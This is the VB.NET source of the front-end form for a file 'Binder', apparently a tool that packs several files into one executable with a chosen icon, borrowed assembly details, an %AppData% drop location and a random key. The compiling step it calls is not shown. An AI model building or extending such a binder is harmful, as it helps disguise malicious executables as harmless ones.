Imports System.Text
Imports System.Security.Cryptography
Public Class Binder
    Public validchars As String = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
    Public Shared rand As New Random()
    Public Resources_Parent = Randomi(rand.Next(3, 16))
    Public assmb As String
    Public iconpathhh As String
    Public outs As String
    Public Shared keyy As String
    Private Sub Binder_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        ComboBox2.Text = "%AppData%"
    End Sub

    Private Sub AddToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles AddToolStripMenuItem.Click
        Dim OfD As New OpenFileDialog
        With OfD
            .Title = "Add File"
            .Filter = "All Files (*.*|*.*"
            .Multiselect = True
            If OfD.ShowDialog() = DialogResult.OK Then
                For Each F In OfD.FileNames
                    Try
                        Dim ico As Icon = Icon.ExtractAssociatedIcon(F)
                        If ico IsNot Nothing Then
                            ImageList1.Images.Add(ico)
                        End If
                    Catch ex As Exception
                        Debug.WriteLine(ex.Message)
                    End Try

                    Dim L = L1.Items.Add(F, ImageList1.Images.Count - 1)
                    L.SubItems.Add(GetFileSize(F))
                    L.SubItems.Add("True")
                    L.SubItems.Add("False")
                Next
                GC.Collect()
            End If
        End With
        L1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
    End Sub

    Private Sub RemoveToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RemoveToolStripMenuItem.Click
        Try
            For Each lstdata As ListViewItem In L1.SelectedItems
                L1.Items.RemoveAt(lstdata.Index)
            Next
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try

    End Sub

    Private Sub ClearToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ClearToolStripMenuItem.Click
        L1.Items.Clear()
    End Sub
    Public Shared Function Randomi(ByVal lenght As Integer) As String
        Dim Chr As String = "asdfghjklqwertyuiopmnbvcxz"
        Dim sb As New System.Text.StringBuilder()
        For i As Integer = 1 To lenght
            Dim idx As Integer = rand.Next(0, Chr.Length)
            sb.Append(Chr.Substring(idx, 1))
        Next
        Return sb.ToString
    End Function
    Dim DoubleBytes As Double
    Public Function GetFileSize(ByVal TheFile As String) As String
        If TheFile.Length = 0 Then Return ""
        If Not System.IO.File.Exists(TheFile) Then Return ""
        '---
        Dim TheSize As ULong = My.Computer.FileSystem.GetFileInfo(TheFile).Length
        Dim SizeType As String = ""
        '---

        Try
            Select Case TheSize
                Case Is >= 1099511627776
                    DoubleBytes = CDbl(TheSize / 1099511627776) 'TB
                    Return FormatNumber(DoubleBytes, 2) & " TB"
                Case 1073741824 To 1099511627775
                    DoubleBytes = CDbl(TheSize / 1073741824) 'GB
                    Return FormatNumber(DoubleBytes, 2) & " GB"
                Case 1048576 To 1073741823
                    DoubleBytes = CDbl(TheSize / 1048576) 'MB
                    Return FormatNumber(DoubleBytes, 2) & " MB"
                Case 1024 To 1048575
                    DoubleBytes = CDbl(TheSize / 1024) 'KB
                    Return FormatNumber(DoubleBytes, 2) & " KB"
                Case 0 To 1023
                    DoubleBytes = TheSize ' bytes
                    Return FormatNumber(DoubleBytes, 2) & " bytes"
                Case Else
                    Return ""
            End Select
        Catch
            Return ""
        End Try
    End Function

    Private Sub L1_DragDrop(sender As Object, e As DragEventArgs) Handles L1.DragDrop
        Dim files() As String = e.Data.GetData(DataFormats.FileDrop)
        For Each path In files
            If IO.File.Exists(path) Then

                Try
                    Dim ico As Icon = Icon.ExtractAssociatedIcon(path)
                    If ico IsNot Nothing Then
                        ImageList1.Images.Add(ico)
                    End If
                Catch ex As Exception
                    Debug.WriteLine(ex.Message)
                End Try
                Dim L = L1.Items.Add(path, ImageList1.Images.Count - 1)

                L.SubItems.Add(GetFileSize(path))
                L.SubItems.Add("True")
                L.SubItems.Add("False")

            End If

        Next
        GC.Collect()
        L1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
    End Sub

    Private Sub L1_DragEnter(sender As Object, e As DragEventArgs) Handles L1.DragEnter
        If e.Data.GetDataPresent(DataFormats.FileDrop) Then
            e.Effect = DragDropEffects.Copy
        End If
    End Sub

    Private Sub L1_SelectedIndexChanged(sender As Object, e As EventArgs) Handles L1.SelectedIndexChanged

    End Sub


    Private Sub TrueToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles TrueToolStripMenuItem.Click
        Try
            For Each lstdata As ListViewItem In L1.SelectedItems
                lstdata.SubItems(2).Text() = "True"
            Next
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try

    End Sub

    Private Sub FalseToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles FalseToolStripMenuItem.Click
        Try
            For Each lstdata As ListViewItem In L1.SelectedItems
                lstdata.SubItems(2).Text() = "False"
                lstdata.SubItems(3).Text = "False"
            Next
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Sub

    Private Sub TrueToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles TrueToolStripMenuItem1.Click
        Try
            For Each lstdata As ListViewItem In L1.SelectedItems
                If lstdata.SubItems(2).Text() = "True" Then
                    lstdata.SubItems(3).Text() = "True"
                End If
            Next
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Sub

    Private Sub FalseToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles FalseToolStripMenuItem1.Click
        Try
            For Each lstdata As ListViewItem In L1.SelectedItems
                lstdata.SubItems(3).Text = "False"
            Next
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Sub

    Private Sub ContextMenuStrip1_Opening(sender As Object, e As System.ComponentModel.CancelEventArgs) Handles ContextMenuStrip1.Opening

    End Sub


    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click


        If L1.Items.Count > 0 Then

            Try







                Dim saveFileDialog As SaveFileDialog = New SaveFileDialog With {
                    .Filter = ".exe (*.exe)|*.exe",
                    .OverwritePrompt = False,
                    .FileName = "Output"
                }

                If saveFileDialog.ShowDialog() = DialogResult.OK Then
                    Dim sb As New StringBuilder()
                    Dim rand As New Random()
                    For i As Integer = 1 To 17
                        Dim idx As Integer = rand.Next(0, validchars.Length)
                        Dim randomChar As Char = validchars(idx)
                        sb.Append(randomChar)
                    Next i
                    Dim randomString = sb.ToString()
                    keyy = randomString

                    outs = saveFileDialog.FileName
                    Binderdom.Compiler(outs, Resources_Parent)
                End If
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If




    End Sub
    Private Sub CheckBox1_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox1.CheckedChanged
        If CheckBox1.Checked = True Then
            Dim OfD As New OpenFileDialog
            With OfD
                .Title = "Select Exe File"
                .Filter = "(*.exe|*.exe"
                If OfD.ShowDialog() = DialogResult.OK Then
                    assmb = OfD.FileName

                Else
                    assmb = Nothing
                    CheckBox1.Checked = False
                End If

            End With


        End If
        If CheckBox1.Checked = False Then
            assmb = Nothing
            CheckBox1.Checked = False
        End If
    End Sub

    Private Sub CheckBox2_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox2.CheckedChanged
        If CheckBox2.Checked = True Then
            Dim OfD As New OpenFileDialog
            With OfD
                .Title = "Select Icon"
                .Filter = "Icons Files(*.exe;*.ico;)|*.exe;*.ico"
                .InitialDirectory = Application.StartupPath & "\Icons"
                If OfD.ShowDialog() = DialogResult.OK Then
                    If OfD.FileName.EndsWith(".exe") Then
                        iconpathhh = EXEICO.GetIcon(OfD.FileName)
                        PictureBox1.ImageLocation = (iconpathhh)
                        GC.Collect()
                    Else
                        iconpathhh = OfD.FileName
                        PictureBox1.ImageLocation = (iconpathhh)
                    End If

                Else
                    iconpathhh = Nothing
                    PictureBox1.Image = Nothing
                    CheckBox2.Checked = False
                End If

            End With


        End If
        If CheckBox2.Checked = False Then
            iconpathhh = Nothing
            PictureBox1.Image = Nothing
            CheckBox2.Checked = False
        End If
    End Sub


End Class